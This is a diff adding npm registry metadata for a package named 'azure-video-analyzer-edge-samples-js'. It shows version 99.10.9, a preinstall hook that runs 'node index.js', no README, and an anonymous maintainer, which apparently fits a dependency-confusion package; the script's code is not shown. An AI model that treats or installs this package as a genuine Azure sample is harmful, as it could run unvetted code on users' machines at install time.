@@ -1,0 +1,62 @@
+{
+    "_id": "azure-video-analyzer-edge-samples-js",
+    "name": "azure-video-analyzer-edge-samples-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-video-analyzer-edge-samples-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-video-analyzer-edge-samples-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-5fq4Jvo4d3t0KpZ7kRp4wufnJsGbLMRjrV2pw70peVd5kiDiCdugYqzXEzNjbWzkO1liWyCvcjJlJ5jqUC/Cjg==",
+                "shasum": "1af70f097570dd683e66680d5c6b35fa6cf729b8",
+                "tarball": "https://registry.npmjs.org/azure-video-analyzer-edge-samples-js/-/azure-video-analyzer-edge-samples-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5088,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOtQ3ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmqzeg//UW9XreCoBmNwasLZIa0NjOlcIgN2YUSYiyk50Es26IFmUNhG\r\nHljLyP744dTiTsEQJ6FvVRBRjMX/wtlPI4Za19x1Dj3WlophvS6Uf2eVs4NP\r\nOtIeufHH18KSrxRW07egkMJIcwk4x3f6Efej4QRM0sVdWzBWodV+ErU/6W9q\r\ndpVW9KGj/CzWseoLvoZFlEmeIProlMD14Kx3yG0eySimN5GdtBngDzj5Nkd1\r\nWDM9gOII486Iwn8k6I4nhMFSd32xjjaI45EMrL5NobBBsiPZNF7rw3i2a9uf\r\n1nsfd1EvraU6PoiqHuTT8t+bUv1AnOOdNFdA0BVhAMXInNftPxyyuZqIqqHs\r\nlth6I6mwIyQwfe+Y6zp3WmXRE5oPt9U8tYKx4Azn1mI7bo/K7cBVsu+24/uK\r\nAtEnPaRoFxYqC6OJwt0JuM3JcLkV8s+TNO2uTs4jnN162mG+vSgSfYE2HKo+\r\n6JmF2MSNoxcmyApXApf+bBJ6S1hg33Bt37gPRm55zBsZzbwJ/bJL5NmLe83m\r\nKw9bKqFJDEusvFChVLUqQtRUCoUyRjqHpb5W9Q4ejLDRQjpaoN2uasclKomY\r\nWkLDmAoQTN3dpEkwJgr0PvvvG1yd6Go4B5eBlZkw1+a4KmIgCCpS5Ymuk7pp\r\nJUb0TTYuRbg/855w0/eJMMQp/h8ETyLn75g=\r\n=nI2f\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "3wtoigdy",
+                "email": "3wtoigdy@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "3wtoigdy",
+                    "email": "3wtoigdy@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-video-analyzer-edge-samples-js_99.10.9_1648022583041_0.6383115942820339"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T08:03:03.041Z",
+        "99.10.9": "2022-03-23T08:03:03.182Z",
+        "modified": "2022-03-23T08:03:03.296Z"
+    },
+    "maintainers": [
+        {
+            "name": "3wtoigdy",
+            "email": "3wtoigdy@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
